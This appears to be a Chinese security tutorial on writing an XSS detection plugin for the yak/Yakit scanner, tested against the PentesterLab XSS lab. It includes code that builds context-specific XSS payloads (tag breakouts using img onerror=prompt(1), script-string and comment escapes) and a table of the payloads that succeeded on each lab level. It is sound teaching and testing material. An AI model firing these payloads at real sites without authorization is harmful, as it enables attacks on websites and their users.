## 背景

上一篇介绍了XSS 启发式检测基础设施，本篇通过yak提供的基础设施编写一个xss检测插件。

本次xss靶场使用pentesterlab的xss靶场。

# 环境部署

    
    
    git clone https://github.com/yaklang/vulinone
    cd php-web-for-pentester
    docker-compose up -d

# 编写思路

参考上一期XSS 启发式检测基础设施中的思维导图:

![](https://image.3001.net/images/20220708/1657252199_62c7a967efbaf435dd7ee.jpg!small)

为了实现启发式漏洞检测，需要对目标环境进行检测：

  1. 检测目标过滤了哪些字符、语句，过滤掉受过滤影响的payload，减少无效发包。

  2. 检测哪个参数在html有回显、回显位置。

  3. 猜测目标生成html方式，模板生成？还是后端拼接的html？

所以我们的思路可以大致形成这样的思维导图:

![](https://image.3001.net/images/20220708/1657252230_62c7a986843a64d9dc20e.jpg!small)

## 判断回显位置

这里先生成随机数，然后进行fuzz，最后使用`xhtml.Find`方法找到字符串的回显位置。

    
    
    randStr = str.RandStr(5)
    respChannel, err = param.Fuzz(randStr).Exec()
    die(err)
    rssp = <-respChannel
    rawBody, err = str.ExtractBodyFromHTTPResponseRaw(rssp.ResponseRaw)
    die(err)
    matchNodes = xhtml.Find(rawBody, randStr)

## 根据回显位置分类并生成对应payload

这里我们简单地将回显位置分为四类，对于不同类型我们构造不同的payload。

    
    
    1.(tag)标签内文本: 构造标签闭合
    2.(attr)属性: 构造标签闭合或伪协议,如果是特殊属性可以直接使用javascript代码
    3.(comment)注释：构造标签闭合
    4.(js)script 标签内：构造标签闭合或dom型

示例代码如下：

我们可以看到node中有许多方便的方法可以很简单地获取这个节点的详细信息，如节点类型(Text,Comment,Attr等)，节点标签名。

根据获取到的信息我们可以来将回显分类并生成对应的payload，这里还有一些特殊的处理，比如判断回显是否在引号内，判断是否是特殊属性等。

    
    
    payloads = []
    
    for _, matchNode = range matchNodes {
    
        if matchNode.IsText() {
            /* 
            4. script标签内
            例：<script>a = '<参数>';</script> 
            */
            if matchNode.TagName == "script" {
                // 引号判断
                matchText = matchNode.MatchText
                randStrIndex = str.Index(matchNode.MatchText, randStr)
                quote = ""
                for {
                    randStrIndex -= 1
                    if randStrIndex < 0{
                        break
                    }
                    chr = string(matchText[randStrIndex])
                    if chr == "=" {
                        break
                    } elif chr == "\"" {
                        quote = "\""
                    }elif chr == "'" {
                        quote = "'"
                    }
                }
    
                payloads = append(payloads, newPayload(sprintf("1%s;prompt('%s');%s", quote, verifyRandStr, quote), ";"+quote, "js"))
    
                payloads = append(payloads, newPayload(sprintf("1%s;</%s><img id='%s' src=1 onerror='prompt(1)'><%s>%s", quote, matchNode.TagName, verifyRandStr, matchNode.TagName, quote), "<>"+quote, "tag"))
            } else {
                /*
                1.标签内文本: 构造标签闭合
                例：<div><参数></div>
                */
                payloads = append(payloads, newPayload(sprintf("</%s><img id='%s' src=1 onerror='prompt(1)'><%s>", matchNode.TagName, verifyRandStr, matchNode.TagName), "<>", "tag"))
            }
        } elif matchNode.IsAttr() {
            /*
            2.属性: 构造标签闭合或伪协议,如果是特殊属性可以直接使用javascript代码
            例：<div id="<参数>"></div> <img src=1 onerror="<参数>"></div> 
            */
            attrName = str.ToUpper(matchNode.Key)
            
            // 特殊属性处理
            if specialAttr(attrName) {
                payload = specialAttrPayload(attrName, verifyRandStr)
                payloads = append(payloads, newPayload(payload, "", "spec-attr"))
            } else {
                payload = sprintf("\"></%s><img id='%s' src=1 onerror='prompt(1)'><%s %s=\"", matchNode.TagName, verifyRandStr, matchNode.TagName, matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
    
                payload = sprintf("'></%s><img id='%s' src=1 onerror='prompt(1)'><%s %s='", matchNode.TagName, verifyRandStr, matchNode.TagName, matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
    
                payload = sprintf("></%s><img id='%s' src=1 onerror='prompt(1)'><%s %s=", matchNode.TagName, verifyRandStr, matchNode.TagName, matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
            }
        } elif matchNode.IsCOMMENT() {
            /*
            3.注释：构造标签闭合
            例：<!-- <参数> -->
            */
            payloads = append(payloads, newPayload(sprintf("-->%s<script>prompt(1);</script><!--", verifyRandStr), "<>-", "comment"))
        }
    }

## 过滤检测

过滤可能是后端框架、自定义方法过滤，可能是前端过滤，也可能是waf过滤，

可能过滤的除了字符还可能是script、alert、prompt、div等语句，

这里作为演示，我们只是简单地将一些危险字符，如`< > ' " / \ - `进行了判断，将过滤的字符数组都写入到`filterChars`这个数组中。

    
    
    // ! 四 检测危险字符并过滤payload
    filterChars = []
    allDangerousChars = ["<", ">", "'", "\"", "/", "-"]
    i = 0
    
    detectPayload = randStr + str.Join(allDangerousChars, randStr) + randStr
    resp, err = param.Fuzz(detectPayload).Exec()
    die(err)
    rspo = <-resp
    body, err = str.ExtractBodyFromHTTPResponseRaw(rspo.ResponseRaw)
    die(err)
    randStrFromIndex = string(body)
    
    for {
        n, btChr = xhtml.MatchBetween(randStrFromIndex, randStr, randStr, 50)
        if n == -1 || i >= len(allDangerousChars){
            break
        }
    
        if allDangerousChars[i] != btChr {
            pass = false
            filterChars = append(filterChars, string(allDangerousChars[i]))
        }
        randStrFromIndex = randStrFromIndex[n:]
        i += 1
    }
    log.debug(sprintf("[%d]filterChars: %s", len(filterChars), filterChars))

## 使用过滤后的payload测试

在拿到filterChars的时候我们就可以通过判断payload中是否包含这些过滤的字符从而来筛选掉一部分payload，

将筛选过后的payload进行测试，然后根据回显来判断是否存在xss，根据之前回显类型的不同，判断存在xss的方式也有所不同，

这里使用到了并发技术，将结果写入管道中。

    
    
    payloadFuzzTask = func(swg, resultCh, url, param, verifyRandStr, payload) {
        swg.Add()
    
        go func {
            defer swg.Done()
    
            
            freq = param.Fuzz(payload.value) 
            httpReq, err = freq.GetFirstFuzzHTTPRequest()
            checkErr(err)
            rawReq, err = httpReq.GetOriginHTTPRequest()
            checkErr(err)
            reqBody, err = http.dump(rawReq)
            checkErr(err)
            reqBody = string(reqBody)
            respChannel,err =  freq.Exec()
            checkErr(err)
            rssp = <-respChannel
            newBody, err = str.ExtractBodyFromHTTPResponseRaw(rssp.ResponseRaw)
            checkErr(err)
    
            existVuln = false 
            maybeVuln = false
            extraMsg = ""
            payloadType = payload.payloadType
    
            if payloadType == "js" {
            verifyMatchNodes = xhtml.Find(newBody, verifyRandStr) // js类型的payload判断漏洞存在条件为: js中包含"verifyRandStr"这个字符串字面量
                for _, matchNode = range verifyMatchNodes {
                    if matchNode.TagName != "script" {
                        continue
                    }
                    result,err = js.ASTWalk(matchNode.MatchText)
                    if err != nil { // 如果ASTWalk报错，则可能存在xss
                        existVuln = true
                        maybeVuln = true
                        break
                    }
                   
    
                    for _,s = range result.StringLiteral{
                        if s == verifyRandStr {
                            existVuln = true
                            break
                        }
                    }
    
                    if len(result.BadSyntax) > 0 { // 如果js语法出现错误，则可能存在xss
                        existVuln = true
                        maybeVuln = true
                        break
                    }
                }
            } else {
                if payloadType == "comment" { // comment类型的payload判断漏洞存在条件: 逃出注释
                    verifyMatchNodes = xhtml.Find(newBody, verifyRandStr) 
                    for _, matchNode = range verifyMatchNodes {
                        if matchNode.IsText() && matchNode.MatchText == verifyRandStr {
                            existVuln = true
                            break
                        }
                    }
                } elif str.HasPrefix(payloadType, "spec") { // ! 对spec-attr类型的漏洞不做判断,可能存在误报
                    existVuln = true
                    maybeVuln = true
                } else { // tag或attr类型的payload判断漏洞存在条件: 存在属性值为verifyRandStr的节点，证明标签逃逸或者属性逃逸
                    verifyMatchNodes = xhtml.Find(newBody, verifyRandStr) 
                    for _, matchNode = range verifyMatchNodes {
                        if matchNode.IsAttr() && matchNode.Key == "id" && matchNode.Value == verifyRandStr {
                            existVuln = true
                            break
                        }
                    }
                } 
            }
    
            if existVuln {
                result = newResult(maybeVuln, url, param, payload, reqBody, newBody)
                resultCh <- result
            }
        }
    }

## 输出结果

这里将结果使用log打印出来，并写入yakit数据库中。

    
    
    // 最后结果 日志输出
    xssLog = func(result, saveDB) {
        maybeVuln = result.maybeVuln
        url = result.url
        param = result.param 
        payload = result.payload
        reqRaw = result.reqRaw  
        respRaw = result.respRaw
    
        if maybeVuln {
            msg = "Maybe xss"
        } else {
            msg = "Found xss"
        }
        payloadString := sprintf("%s=%s", param.Name(), payload.value)
    
        report = {"message": msg, "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}
        
        yakit_output(report)
        if saveDB {
            risk.NewRisk(
                url,
                risk.title(sprintf("XSS for: %v", url)),
                risk.details(report),
                risk.type("xss"),
                risk.payload(payloadString),
                risk.request(reqRaw), 
                risk.response(respRaw),
                risk.severity("warning"),
            )
        }
    }
    
    // ! 六 输出结果
    saveDB = true 
    for result = range resultCh {
        xssLog(result, saveDB)
        if saveDB {
            saveDB = false
        }
    }   

# 简要演示

启动劫持：

![](https://image.3001.net/images/20220708/1657252460_62c7aa6c1e6f61e385850.png!small)

在左边勾选我们需要启动的MITM插件，浏览器设置代理，访问存在漏洞的靶场页面。

![](https://image.3001.net/images/20220708/1657252481_62c7aa819572faad74ca7.png!small)

将模式修改为被动日志界面，这样才能看到mitm插件的扫描输出，浏览器刷新，重新访问存在漏洞的靶场页面，可以看到插件提示找到了一个xss。

![](https://image.3001.net/images/20220708/1657252501_62c7aa953b7bdc6a75a92.png!small)

同时也将该漏洞的详细信息写入了yakit数据库中。

![](https://image.3001.net/images/20220708/1657252527_62c7aaaf10c7ae18f0937.png!small)

这里我们复制payload，用浏览器手动测试payload是否有效，可以看到成功弹窗。

![](https://image.3001.net/images/20220708/1657252547_62c7aac399f38a3f43ea6.png!small)[操作视频](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/video/boxcnsVx37DIkbwJkdbi7GarfPf/?quality=1080p&data_version=7115333771771166723&mount_point=docx_file)

# 靶场测试

pentesterlab的xss靶场一共有10关，具体的测试报告如下：

 **靶场案例**

|

 **是否检测出漏洞**

|

 **payload**

|

 **说明**  
  
---|---|---|---  
  
example1

|

✔️

|

</DIV><IMg id='qkpEqTvu' src=1 onerror='prompt(1)'><diV>

|

标签内文本 没有过滤直接输出  
  
example2

|

✔️

|

</DIV><IMg id='qkpEqTvu' src=1 onerror='prompt(1)'><diV>

|

标签内文本 过滤了script标签  
  
exmaple3

|

✔️

|

</DIV><IMg id='qkpEqTvu' src=1 onerror='prompt(1)'><diV>

|

标签内文本 过滤了script标签  
  
example4

|

✔️

|

</DIV><IMg id='qkpEqTvu' src=1 onerror='prompt(1)'><diV>

|

标签内文本 过滤了script关键字  
  
example5

|

✔️

|

</DIV><IMg id='qkpEqTvu' src=1 onerror='prompt(1)'><diV>

|

标签内文本 过滤了alert关键字  
  
example6

|

✔️

|

1";</scRipT><iMG id='OOXNhBmZ' src=1 onerror='prompt(1)'><SCRIPT>"

1";prompt('OOXNhBmZ');"

|

script标签内 没有过滤直接输出

  
  
  
example7

|

✔️

|

1";prompt('OOXNhBmZ');"

|

script标签内

使用htmlentities函数过滤  
  
example8

|

❌

|

  

|

标签内属性

注入点存在于URL路径

插件没有覆盖到测试点  
  
example9

|

❌

|

  

|

script标签内

注入点存在于URL锚

DOM型xss，插件暂不支持  
  
# 不足

这个插件仅仅是作为一个简单的演示，抛砖引玉，实际上我们可以知道它还存在很多的不足:

  1. 只能检测反射型xss，无法检测dom型xss

  2. 对一些特殊位置上的xss无法覆盖(例如路径参数上/某个请求头上)

了解更多Yak相关信息，欢迎及时关注我们的官网/微信公众号；或者加入小小的技术讨论组（进讨论组请添加微信），立即获取最新的技术姿势。  

